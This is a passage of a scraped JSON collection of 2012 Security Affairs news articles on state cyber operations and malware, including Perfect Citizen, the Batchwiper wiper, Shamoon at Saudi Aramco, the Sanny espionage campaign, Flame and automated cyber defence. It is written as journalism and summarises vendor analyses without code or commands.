pipeline controllers, with the purpose to discover security vulnerabilities.\n\nThe program was revealed by new documents from EPIC (the Electronic Privacy Information Center), the purpose is the exploration of national utilities to discover security vulnerabilities that could be exploited to attack US infrastructure.\n\n\n\nThe Perfect Citizen documentation, according CNET, is composed of 190 pages and it has been obtained by EPIC in respect of Freedom of Information Act. Most of file is \u201cclassified top secret,\u201d and has been deleted for obvious reasons.\n\nPerfect Citizen program was originally reported to be a program to develop a smart network of sensors (named Einstein) to detect cyber attacks against critical infrastructures in both the private and public sector. It is funded by the Comprehensive National Cybersecurity Initiative and thus far Raytheon,  the major American defense contractor and industrial corporation, has received a contract for up to $91 million to establish the project.\n\nThe program is very interesting and is the demonstration of the great interest on cyber security of US Government that fears cyber attacks and their consequences on Homeland Security, the program will go on at least until September 2014.\n\nThe knowledge of control systems vulnerabilities could increase defense cyber capabilities of the country but in the same time gives to the US a further option for its military offensive in the cyberspace.\n\nThe case of Stuxnet virus has for first time demonstrated to worldwide security community the real meaning of cyber weapon, concept until then much discussed but almost never used in military operations between states.\n\nBut if Stuxnet was developed by US with support of Israel, it\u2019s normal to expect that the analysis of the possible impact of a cyber attacks against a control system inside a facility isn\u2019t a new concept, the Perfect Citizen program is just an new phase of a study initiated many years ago, probably during the Bush\u2019s Government, as many experts argue.\n\nU.S. intelligence have warned for years both government and private sector about the possibility that an attacker, a group of terrorist or a group of foreign state-sponsored hackers, could exploit vulnerabilities inside control system of critical infrastructures.\n\nDespite the high level of attention of US government SCADA system inside critical infrastructures of the countries are still too vulnerable.  Recently I published on The Hacker News web site an article titled \u201cHunting vulnerabilities in SCADA systems, we are still too vulnerable to cyber attacks\u201d in which I describe how is simple to identify possible targets of a cyber attacks and how much simple is to retrieve also exploit designed to hit particular categories of control systems. Theoretically everyone today could acquire necessary knowledge to build its cyber weapon at home and attack a critical infrastructure.\n\nOffense and defense don\u2019t proceed at same speed that this could cause serious problems, Gen. Martin Dempsey, the chairman of the Joint Chiefs of Staff, told a congressional committee in February:\n\n\u201cI know what we [the U.S.] can do and therefore I am extraordinarily concerned about the cyber capabilities of other nations.\u201d If a nation gave such software to a fringe group, \u201cthe next thing you know could be into our electrical grid.\u201d\n\nThe divulgation of information on cyber warfare operations by U.S. government is clear signal of the formalization of its effort in the fifth domain of warfare, several governments and agencies sources are spreading information on new ongoing projects characterized by high technological content. Recently I wrote on the solicitation of US intelligence for the definition of new exploiting methods mainly focused on mobile devices meanwhile NSA is public recruiting Control System Network Vulnerability Analyst to involve in \u201cbuilding proof-of concept exploits\u201d.\n\nThe order is to improve cyber capabilities and inform US citizens of government projects and risk related to a cyber attacks.\n\nThe President Obama has confirmed US intent to invest in the development of cyber capabilities, according The Washington Post he secretly signed a directive in October that regulate offensive \u201ccyber-operations\u201d and Rules of Engagement in the cyberspace.\n\nThe document \u201cA Framework for Assessing and Improving the Security Posture of Industrial Control Systems (ICS)\u201d published by NSA reiterates the need of protect Industrial Control Systems, following some a meaningful statements form the report:\n\n\u201cMuch of the United States\u2019 critical infrastructure is dependent on industries that employ networked ICS systems. Sabotage or disruption of these industries can have wide-ranging negative effects including loss of life, economic damage, property destruction, or environmental pollution. Our reliance on ICS networks makes them attractive targets for electronic attack. Because of this, it is important for industrial control system owners and operators to systematically assess the threat of electronic attack against their critical networked assets and to apply defensive technologies to reduce the threat. Cost-benefit analysis allows us to prioritize defensive efforts by identifying security improvements that provide the greatest benefit for a given cost. The \u201ccost\u201d is the expenditure required to implement and maintain the security improvement (financial, manpower, etc.) The \u201cbenefit\u201d is the empirical savings gained by having the security improvement in place..\u201d \n\nIn reality in the past the press already proposed news on the program, in 2010 The Wall Street Journal revealed the existence of Perfect Citizen in article, but the project in the years has concentrated the media attention and multiple charges to be a dangerous surveillance system deployed by government. It is described by critics as \u201cBig Brother\u201d and raised privacy concerns for government intervention in the private sector.\n\nCNET post proposed the declaration of an NSA spokeswoman about the project:\n\n[Perfect Citizen is] \u201cpurely a vulnerabilities assessment and capabilities development contract\u201d that \u201cdoes not involve the monitoring of communications or the placement of sensors on utility company systems.\u201d\n\nProjects like this are vital for the protection of critical infrastructure of a country, while I understand the concerns of private industry for the interference of governments, the possible effects of a cyber attack on the nation are devastating. Prevention and the development of a proactive defense is an obligation for each country that really wants to ensure the safety of its facilities.\n\nAs always, similar projects should involve all stakeholders, in some countries, such initiatives may lead to dangerous government interference in private industry from unforeseen consequences.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-capabilities", "topic_name": "cyber capabilities"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/exploiting-methods", "topic_name": "exploiting methods"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/perfect-citizen", "topic_name": "Perfect Citizen"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/surveillance-system", "topic_name": "surveillance system"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/vulnerability", "topic_name": "vulnerability"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/vulnerability-assessment", "topic_name": "vulnerability assessment"}]}, {"news_name": "Iran, the cyber shooting range, new malware detected", "news_link": "https://securityaffairs.co/wordpress/11157/malware/iran-the-cyber-shooting-range-new-malware-detected.html", "title": "Iran, the cyber shooting range, new malware detected\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "December 19, 2012", "body": "On December 16th the Iranian Maher center issued an advisory warning of a new \u201ctargeted data wiping\u201d malware discovered during an investigation.\n\nFirst analysis of the center revealed that the malicious code has a simple as efficient design that allow it to wipe files on different drives in various predefined times. The malware wipes disk partitions and user profile directories avoiding ordinary anti-virus software detection, Maher advisory provided the list of components of the malware\n\n \n\nAme\n\nMD5\n\nGrooveMonitor.exe [dropper]\n\nf3dd76477e16e26571f8c64a7fd4a97b\n\njuboot.exe\n\nfa0b300e671f73b3b0f7f415ccbe9d41\n\njucheck.exe\n\nc4cd216112cbc5b8c046934843c579f6\n\nSLEEP.EXE\n\nea7ed6b50a9f7b31caeea372a327bd37\n\nWmiPrv.exe\n\nb7117b5d8281acd56648c9d08fadf630\n\n \n\nJuboot.exe and jucheck.exe components mask disguise themselves as a Java auto update program, meanwhile the SLEEP.EXE application is a freeware tool to delay application startup.\nThe Trojan is distributed as a self-extracting WinRAR archive named GrooveMonitor.exe that once executed drops the components juboot.exe, jucheck.exe and SLEEP.EXE.\nThe malware seems to have no links with precedent cyber threats that hit the countries such as Stuxnet, Duqu and Shamoon.\n\n \n\n\n\nOf course many antivirus producer and security companies has started the researches on the malware. SophosLabs confirmed the malware presence and the capabilities described by Maher center but doesn\u2019t share Iranian conviction that it\u2019s a targeted attack.\n\nThe Sophos blog reported:\n\n\u201cJuboot.exe is actually a simple DOS BAT file that has been converted to a Windows PE (Portable Executable) file using a Batch to Exe Converter. It uses SLEEP.EXE to wait for two seconds, then sets a registry key to start jucheck.exe on system boot.\nUpon execution jucheck.exe waits two seconds, erases GrooveMonitor.exe and juboot.exe, then checks to see if the date matches any of the following:\n10-December-2012 to 12-December-2012\n21-January-2013 to 23-January-2013\n06-May-2013 to 08-May-2013\n22-July-2013 to 24-July-2013\n11-November-2013 to 13-November-2013\n3-February-2014 to 5-February-2014\n5-May-2014 to 7-May-2014\n11-August-2014 to 13-August-2014\n2-February-2015 to 4-February-2015.\nIf the date matches, it waits for 50 minutes, then performs a recursive delete on the aforementioned drive letters and deletes everything from the user\u2019s desktop.\u201d\n\nAs explained by Sophos experts the malicious payload is very simple,  it will also wipe all files from the victim\u2019s desktop.\n\nSophos research team also discovered a different variant of the malware that replaced jucheck.exe component with a new on called Wmiprv.exe and that tries to delete GrooveMonitor.exe from\n\nC:\\Documents and settings\\All Users\\Start Menu\\Programs\\Startup\\\n\nand runs in an endless loop every 50 minutes to erase the drives. Sophos commented this discovery with following statement:\n\n\u201cThis is likely indicative of a more advanced dropper file and a way to be sure to harm machines that are not rebooted during the specified time windows.\u201d\n\nRoel Schouwenberg from Kaspersky lab added further interesting details revealed by the analysis conducted by his team on the malware named GrooveMonitor.\n\n\u201cAfter trying to delete all the files on a particular partition the malware runs chkdsk on said partition. I assume the attacker is trying to make the loss of all files look like a software or hardware failure. Next to these BAT2EXE files there\u2019s also a 16-bit SLEEP file, which is not malicious. 16-bit files don\u2019t actually run on 64-bit versions of Windows. This immediately gives away the malware\u2019s presence on a x64 machine.\u201d\n\n \n\nSymantec identified the cyber threat as Trojan.Batchwiper sharing same information of Kaspersky and Sophos.\n\nDespite the malware appears really simple and hasn\u2019t created great problems to the victim country it could be indicator of ongoing development of a new cyber weapon. The detected module could be designed for testing purposes or as a part of a of a broader project.\nRoel Schouwenberg concluded his analysis with a very meaningful statement:\n\n\u201cThe era of cyber-sabotage has arrived.

Hackers used the Shamoon malware to attack the systems of the company, fortunately, production environment wasn\u2019t impacted.\n\nThe malware is able to wipe files from the drive on the infected machine and according to security experts it was used also for others cyber attacks against Qatari RasGas oil company.\n\nIn the first phase of analysis, the presence of internal coding errors suggested to security experts that the creation of the malware was attributable to a work of amateurs, but is it really true? Could it be a diversionary tactic to divert attention from the real authors of malicious code?\n\nSaudi Aramco supplies a tenth of the world\u2019s oil, the attack infected 30,000 computers and crippled the national oil company\u2019s electronic networks.Internal security response team brought down the internal network to mitigate the cyber threat avoiding its diffusion to other internal systems, cleaning operations lasted around 10 days.\n\n\n\nAramco and the Saudi Interior Ministry are investigating the attack. A ministry spokesman, Maj. Gen. Mansour al-Turki, said the attackers were an organized group operating from countries on four continents.\n\n \u201corganized group launched the attack from outside the kingdom and from different countries\u201d, Saudi news agency Al Arabiya reported.\n\nAccording to the company and Saudi government officials the real intent of the attack was to halt fuel production of the company, the investigations are still ongoing, Aramco\u2019s vice president for corporate planning, Abdullah al-Saadan, declared at Al Ekhbariya television:\n\n\u201cThe main target in this attack was to stop the flow of oil and gas to local and international markets and thank God they were not able to achieve their goals.\u201d\n\nThe motivation of the attack is politics, the hackers accused the policy of Royal Family and its interference in the political disputes of neighboring countries, such as Syria and Bahrain.\n\nSaudi Arabia provided military support to Bahrain last year to back the Persian Gulf state\u2019s rulers rejecting Shiite-led protesters. Saudi Arabia could have also fund Syria rebel army to increase pressure on the Assad regime.\n\nThe Guardian journal reported:\n\n\u201cThe Guardian witnessed the transfer of weapons in early June near the Turkish frontier. Five men dressed in the style of Gulf Arabs arrived in a police station in the border village of Altima in Syria and finalised a transfer from the Turkish town of Reyhanli of around 50 boxes of rifles and ammunition, as well as a large shipment of medicines.\n\nThe men were treated with deference by local FSA leaders and were carrying large bundles of cash. They also received two prisoners held by rebels, who were allegedly members of the pro-regime militia, the Shabiha.\n\nThe influx of weapons has reinvigorated the insurrection in northern Syria, which less than six weeks ago was on the verge of being crushed\u201d\n\nMeanwhile, Saudi authorities are conducting the investigation voice on US involvement in the attack are circulating on the internet, FARS news agency (FNA) has recently published an article that reports a new sensational update on the famous event.\n\nAccording to the agency, an informed source in Aramco took the US Department of Defense responsible for the cyber attack.\n\n\u201cProofs and evidence show that the cyber attack on Aramco company has been carried out by a foreign group and given the record of virus attacks against Aramco it can be said that Pentagon is behind it,\u201d FNA reported.\n\nThe accusation is undoubtedly heavy and open new scenarios, we are in a middle of information warfare in which misinformation is the primary tactics followed by the contenders, last October U.S. declared that Iran was behind cyber attack in Saudi Arabia, the revelation was done by a former U.S. official who has worked on cybersecurity issues.\n\nU.S. government strongly supports that Iranian cyber experts have created the \u201cshamoon\u201d virus that hit Saudi Aramco and RasGas,  Lewis, a senior fellow at the Center for Strategic and International Studies think tank said:\n\n\u201cThere\u2019s generally a conviction that it was Iran,\u201d \n\nUS authorities declared that it was implausible the Iranian government would not be aware of a major cyber operation coming from sources inside the country:\n\n\u201cHow could you do something that consumed a massive amount of bandwidth in Iran and not have the government notice, when it\u2019s monitoring the Internet for political purposes?\u201d\n\nDoubts are legitimate, the unique certainty is the Iranian cyber capabilities are growing like no other representing a great cyber threat for every state, but this is cyber warfare and every state is silently developing its cyber weapons and it trying to exploit networks of foreign adversaries.\n\nIn the next months, the number of cyber espionage operations and more in general of cyber attacks is destined to an exponential increase and in many cases, it will be impossible to track back the real origin of the offensive, every state must be prepared developing an efficient cyber strategy.\n\nPierluigi Paganini\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Saudi Aramco,

threats mainly operated by governments to steal sensible information to foreign states and private companies.\n\nFireEye has revealed a cyber espionage campaign, named \u201cSanny\u201c, attributable to Korea that hosts command-and-control (C&C) servers used in the attacks, the C&C channel is embedded on a legitimate page belonging a Korean message board called \u201cnboard.net.\u201d\n\nThe security experts haven\u2019t revealed if the real origin is North or South Korea, a fundamental factor to indicate which coalition is targeting organizations mainly in Russia, consider that around 80 percent of the victims are Russian organizations:\n\nIdentify Korea as the origin of attacks is very generic, let\u2019s remind that North Korea internet traffic passes on Chinese network infrastructures, differently from South Korean one and that China is one of the countries most specialized in this type of offensive.\n\nThe attacks have used a malware designed to steal email, Facebook credentials and other user-profile information from Russian telecommunications, IT, and space research organizations.\n\nAccording to Ali Islam, security researcher at FireEye, it not be excluded that Korea infrastructures being used as a proxy but the analysis revealed its implication;\n\n\u201cThough we don\u2019t have full concrete evidence, we have identified many indicators leading to Korea as a possible origin of attack. The following are the indicators we have so far:\u201d\n\nThe unique certainly seems to be that experts have detected a state-sponsored attack and that the attackers have demonstrated great cyber capabilities.\n\nThe hackers have chosen a public forum as a starting point for APT attacks, knowing victims\u2019 email server (POP3/IMAP) they obtained email user credentials directly from Outlook application.\n\nThe most singular characteristic of the cyber attacks is the use of a public forum to collect the stolen information.\n\nAli Islam added:\n\n\u201cOnce you have that information, you have access to employees\u2019 emails even from outside, and that means a lot of official information,\u201d Islam says. \u201cIt also steals other accounts credentials, all user passwords stored by Firefox for auto login.\u201d \n\nThe channel of infection is classic, victims received a phishing message containing a malware hidden in a document apparently proposing information related to a meeting of the Association of Southeast Asian Nations. The figure below reports a document written with Cyrillic character set demonstrating the real targets of attacks.\n\n\n\n\u201cThe exploit drops an executable, which drops another .EXE and two .DLLs, and generally creates multiple components that aggravate AV detection and cleanup.\u201d\n\nFireEye detected around 90 infected machines compromised through the exploit of a Microsoft Word vulnerability that allows stealing sensitive data from the victim.\n\n\u201cThe malicious code includes different kinds of obfuscation and encryption at different levels, and sends the data back to a public message board using HTTP POST, and SMTP as fallback,\u201d Islam says.\n\nThe data is sent to the board that does not require authentication mechanisms that make the victims visible.\n\n\n\n \n\nToday the C&C server is still active and the attackers are monitoring it to check new victims and stolen data every couple of days deleting data once acquired.\n\n\u201cIn the last five days, the attacker collected and deleted the data three times approximately after every two days.\u201d\n\nFireEye experts still continue to analyze this cyber espionage campaign \u2026 let\u2019s wait for further interesting results.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 blacklisted apps, hacking)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/north-korea", "topic_name": "North Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sanny", "topic_name": "Sanny"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-attack", "topic_name": "state-sponsored attack"}]}, {"news_name": "The Facebook engagement in the fight against botnets with FBI", "news_link": "https://securityaffairs.co/wordpress/11061/social-networks/the-facebook-engagement-in-the-fight-against-botnets-with-fbi.html", "title": "The Facebook engagement in the fight against botnets with FBI\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "December 14, 2012", "body": "Social networks are platforms that have monopolized majority of user\u2019s internet experience, the imperative is to \u201csocial\u201d, and everybody share an incredible amount of personal information exposing its digital identity to serious risks.\n\nAn element of attraction for cyber criminals is the huge number of services, from gaming to payments, that are developing on these platforms that could be exploited to realize more or less complex fraud schemas.\n\nSocial media platforms are very attractive also for governments and intelligence agencies that are adopting them to conduct OSINT researches, cyber espionage and to influence public sentiment of particular thematic, also law enforcement are demonstrating a great interest on new social tools. Corps such as FBI are developing a new generation of tools to conduct its investigations, recently the U.S. Department of Justice announced the arrest of 10 individuals suspected to have created a botnet that infected more than 11 million of pc all over the world causing financial loss of  more than USD 850 millions.\n\nThe suspected are accused to have actively participated to the realization of one of the most profitable cybercrime in the modern history, they are from different countries and continents such as US, United Kingdom, Bosnia and Herzegovina, Croatia, Macedonia, New Zealand, Peru.\n\nThe story is dated 2008, when the dangerous botnet Butterfly, also known as Mariposa, was discovered after infected 12 million machines worldwide, in 2009 it was decapitated. As usual, the botnet was designed for different purposes, the criminals used , and also rented, illegal services such as spamming and phishing services, denial of service attacks, and sensible information. The bot agents were able to alter also user\u2019s search results inside browser showing advertisements and pop-up ads, hijacking victims navigation.\n\nThe criminals used file-sharing and instant messaging platforms to spread the malicious code known as Yahos that stolen financial information from over 800,000 victims. The virus was active for years, it uses social networks and instant messaging platforms, such as AIM and Yahoo! Messenger, to send \u201cinfected links\u201d to the victims that once link on it allow the downloading of botnet exploits.\n\nFBI press release states:\n\n\u201cFacebook\u2019s security team provided assistance to law enforcement throughout the investigation by helping to identify the root cause, the perpetrators, and those affected by the malware. Yahos targeted Facebook users from 2010 to October 2012, and security systems were able to detect affected accounts and provide tools to remove these threats.\u201d\n\nNo news has been provided regarding the support of Facebook\u2019s security team to law enforcement but it must be considered that it\u2019s not first time that the experts are involved in investigation of this type.\n\nSocial network platforms are privileged targets for cybercrime that in a recent past have spread malware through the popular Facebook. Koobface virus is undoubtedly considered as the malware of social network because it was one of the first to use them as vehicle of infection.\n\nKoobface unlike other malware propagated through social networking using an \u201cactive approach to its spread,\u201d infecting each host and then propagate into the network, regardless of user awareness that in some cases deliberately share content with friends.\n\nThe most common infection method is through via fake content on compromised web site. It is sufficient to click on one of the links which Koobface has posted on this web site. Usually this links attract user proposing the download of cool video or applications, unfortunately behind this links is hidden an installer for the Koobface virus. The good news is that usually this type of malware are identified with little difficulty by leading antivirus on the market.\n\nEarly 2012 another virus has hit Facebook, it was named Ramnit and it has stolen usernames and passwords of more than 45,000 users mainly from France and the UK, according to a bulletin issued by security researchers at Seculert.\n\n\n\nAnyway to prevent the spread of malicious agent it is fundamental that users adopt a proper behavior and use updated security defense systems as suggested by the FBI\u2019s release.\n\nPierluigi Paganini\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/botnets", "topic_name": "Botnets"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/denial-of-service-attacks", "topic_name": "denial-of-service attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/facebook", "topic_name": "Facebook"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/fbi", "topic_name": "FBI"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/fraud-schemas", "topic_name": "fraud schemas"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/koobface", "topic_name": "Koobface"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/osint", "topic_name": "OSINT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/phishing", "topic_name": "phishing"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ramnit", "topic_name": "Ramnit"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-media", "topic_name": "social media"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-networks-2", "topic_name": "social networks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/yahos", "topic_name": "Yahos"}]}, {"news_name": "New weapons for cyber warfare.

The project is born in US military environment, specifically developed by Air Force Research Laboratory, and it explores the possibility to design a directed-energy weapon capable of destroying and interfering with adversary\u2019s electronic systems such as radar systems, telecommunication systems, computer systems and power distribution systems. While the project is started in military and is led by Boeing the technology comes from a small company called Ktech, acquired by Raytheon bought last year, specialized in the providing of microwave generators to generate EMP able to knock out electronics equipments.\n\nThe concept behind directed-energy weapon (DEW) is the transmission  of energy, typically  electromagnetic radiation or electromagnetic radiation,  against a target for a desired effect.\n\nKeith Coleman, CHAMP program manager for Boeing Phantom Works enthusiastic said:\n\n\u201cThis technology marks a new era in modern-day warfare,\u201d \u201cWe hit every target we wanted to.

Many experts believe the rocket is equipped with an electronic pulse cannon which is able to cause voltage surges in target electronic destroying it.\n\nMilitary experts are sure that we are facing with a new generation of cyber weapons for which is still much to be studied, similar devices must be analyzed with attention especially for the real effects they could have on the environment, let\u2019s think for example to the effect of evaporation of target material.\n\nAnother important question is related high power consumption necessary to generate the beam of energy,  existing methods of for conducting and transferring energy against a targets appears still inadequate to produce a convenient hand-held weapon.\n\nProfessor Trevor Taylor from the Royal United Services Institute told the Mail on Sunday newspaper:\n\n\u201cThe historical record shows that important technologies developed in one country are developed elsewhere within a relatively short period \u2013 look what happened with regard to the USSR and nuclear weapons.\u201d\n\nI find the warning of Professor extremely timely and enlightening, the scenario of warfare is changing rapidly and soon a multitude of governments will have similar weapons for which is required an appropriate defense strategy.\n\nPierluigi Paganini \n\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/boing", "topic_name": "Boing"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/champ", "topic_name": "CHAMP"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-capabilities", "topic_name": "cyber capabilities"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapons", "topic_name": "cyber weapons"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/defense-strategy", "topic_name": "defense strategy"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/fifth-domain-of-warfare", "topic_name": "fifth domain of warfare"}]}, {"news_name": "Proactive defense, humans or machines \u2026 that\u2019s the question", "news_link": "https://securityaffairs.co/wordpress/10605/security/proactive-defense-humans-or-machines-thats-the-question.html", "title": "Proactive defense, humans or machines \u2026 that\u2019s the question\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "November 27, 2012", "body": " \n\nGovernments all around the world are committed for the definition of a proper cyber strategy that represents an optimum balance between a good cyber offense and an efficient cyber defense.\n\nCyber conflicts are characterized by the necessity of an immediate cyber response to the incoming cyber threats, in many cases the reaction must be instantaneous to avoid the destruction of assets and resources.\n\nHuman factor and human capacity of judgment could represent element of delay not acceptable in an electronic disputes that happen in real time, due this reason is assuming fundamental importance the concept \u201cproactive defense\u201c.\n\nThe massive introduction of technologies in every object the surround us has increased nation attack surface, power grids, telecommunications and any other critical infrastructure are still vulnerable to cyber attacks.\n\nRecently researchers at Italian security firm ReVuln published a meaningful video showing off a number of zero-day vulnerabilities in SCADA applications designed by manufacturers such as GE, Siemens and Schneider Electric.\n\nThe event is not isolated, a researcher at Exodus Intelligence announced to have discovered more than 20 flaws in SCADA packages is few hours\u2019 of test. Aaron Portnoy, the vice president of research at Exodus, declared:\n\n\u201cThe most interesting thing about these bugs was how trivial they were to find. The first exploitable 0day took a mere 7 minutes to discover from the time the software was installed. For someone who has spent a lot of time auditing software used in the enterprise and consumer space, SCADA was absurdly simple in comparison. The most difficult part of finding SCADA vulnerabilities seems to be locating the software itself,\u201d\n\nThe protection of national infrastructures is one of the primary goals for cyber strategies, but due nature of the possible offense, instantaneous and unpredictable, has highlighted the need to develop systems for automatic defense that can independently respond to a cyber threats from cyber space, but this option introduces significant problems in terms of \u201cdevolution of decision\u201d and \u201crule of engagement\u201d.\n\nAre we ready to trust in such critical decisions taken by the machines?\n\nThe Homeland Security Department In September has released REQUEST FOR INFORMATION \u2013 RFI-OPO-12-0002 titled \u201cDeveloping a Capability Framework for a Healthy and Resilient Cyber Ecosystem Using Automated Collective Action\u201d to gather information from Industry to evaluate the current state of technology in the cyber ecosystem environment.\n\nThis Department is working with NIST to develop system capable of using a defensive concept called Automated Collective Action, following the definition provided in the document:\n\n\u201cAutomated collective action refers to processes in a cyber ecosystem or community of interest (COI) that select (and perhaps formulate) automated courses of action that will be performed by the ecosystem or COI in response to cybersecurity events. Policies, procedures, technology, and a high level of trust are necessary to enable automated collective action. An appropriate level of human intervention might be required to ensure unintended consequences do not result from flawed courses of action. Determining which cybersecurity events are normal and which are unauthorized or malicious remains a major challenge. \u201c \n\nThe officials of DHS declared that US need to respond in automated fashion to automated attacks from cyber space. The researches need to evaluate the feasibility of a system completely independent in the detection of anomalous situations and able to respond in a proportionate manner, the solution thanks to automated processes have to be able to monitor and respond to cyber threat while maintaining mission-critical operations.\n\nThe final target is the substitution of humans into the decision loop to respond to increasingly sophisticated attacks. Despite human response times appears no longer adequate to mitigate the cyber threats, a totally automated system could generate a serious of unmanageable problems due false positives, a future in which machines will decide for us is scaring and humans aren\u2019t yet prepared to this scenario.\n\nIn the past similar solutions have been already approached by US, the NIST  developed in the form of standards and best practices the Security Content Automation Protocol (SCAP) for use by agencies in assessing, monitoring and reporting on system security status.\n\nWhat does the future hold?\n\nOf course, the best solution will be represented by the balance between human intervention and fully automatic process, it is normal to expect that such a boundary for various reasons will move to fully automated solutions.\n\nThe risks are high but the only way to preserve critical assets from automated attacks is to have proactive defense solutions, critical will be the test phase of these systems that must be able to substitute human intervention in critical situation evaluating real time every possible consequence.\n\nhumans or machines \u2026 that\u2019s the question\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-defense", "topic_name": "cyber defense"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-offense", "topic_name": "cyber offense"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/dhs", "topic_name": "DHS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/proactive-defense", "topic_name": "Proactive defense"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/scada", "topic_name": "SCADA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/zero-day-vulnerabilities", "topic_name": "zero-day vulnerabilities"}]}, {"news_name": "The Flame is \u201cignited\u201d between the U.S. and France", "news_link": "https://securityaffairs.co/wordpress/10525/malware/the-flame-is-ignited-between-the-u-s-and-france.html", "title": "The Flame is \u201cignited\u201d between the U.S. and France\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "November 23, 2012", "body": "French weekly news magazine L\u2019Express has reported that offices of France\u2019s former president Sarkozy were hit by a cyber espionage campaign back in May 2012. Few days before the second round of the presidential election won by Hollande the President\u2019s office was infected by Flame malware, within the compromise PCs also the one of Sarkozy\u2019s Secretary General, Xavier Musca.\n\n\n\nWhat is Flame malware and who has developed it?\n\nFlame is considered a complex malware realized with the primary intent to create a comprehensive cyber espionage tool kit. The geographic distribution of the targets hit by the malware, primary located in the Middle East, combined with the high level of sophistication of the agent are clear clues that the malicious application  is the result of a  state sponsored project.\n\n\u201cKaspersky Team defined Flame as a sophisticated attack toolkit which condenses the characteristics of a backdoor, a Trojan, and a worm able to spread itself within a local network and on removable media.\u201d\n\nRoel Schouwenberg , Kaspersky researcher, reveled a link between Flame  and the cyber weapon Stuxnet noting that a module of the spytool were also used in a particular version of Stuxnet.\n\n\u201cFlame was used as some sort of a kick-starter to get the Stuxnet project going,\u201d he stated. \u201cAs soon as the Stuxnet team had their code ready, they went their way.\u201d Schouwenberg said.\n\nStarting from 2009, the evolution of the two projects has proceeded independently. The security community is also convinced that Stuxnet Virus was part of a US cyber warfare project prosecuted by Obama, accordingly many experts attribute the paternity of Flame to a joint venture between U.S. and Israel\n\nThe use of Flame in a cyber attack against French government is the demonstration of a cyber espionage campaign to steal sensible information to top politicians of the country. Exponents of French Govenments declared:\n\n\u201cHackers have not only managed to get to the heart of French political power,\u201d \u201cbut they were able to search the computers of close advisers of Nicolas Sarkozy.\u201d\n\nThe cyber espionage campaign probably has been successful in the disclosure of confidential information regarding the policy of the French government even if it seems not to have directly involved the President who does not use a specific computer.\n\n \u201csecret notes were recovered from hard drives, and also strategic plans.\u201d reports the article.\n\nThe attack against the President office was of spear phishing type that used popular social network Facebook to spread the malware. The attackers have shared a link to an infected website that was a replica of the Elysee\u2019s intranet, the hackers have used it to infect the machine and also to gather user\u2019s credentials. All the machines  part of presidential network, including a number of Sarkozy\u2019s closest collaborators, were infected by Flame agent.\n\nThe links between Stuxnet and Flame led to think that US are responsible for the attack against \u00c9lys\u00e9e Palace, but it was the immediate response of the U.S. government that denied any implication.\n\nHomeland Security spokesman Matthew Chandler declared to The Hill in a statement.\n\n\u201cFrance is one of our strongest allies. \u201cWe categorically deny the allegations by unnamed sources that the U.S. government participated in a cyberattack against the French government,\u201d \u201cOur outstanding cooperation in intelligence sharing, law enforcement and cyber defense has never been stronger, and remains essential in successfully combating the common threat of extremism,\u201d\n\nHomeland Security Secretary Janet Napolitano released the following declarations on the event:\n\n\u201cWe have no greater partner than France; we have no greater ally than France 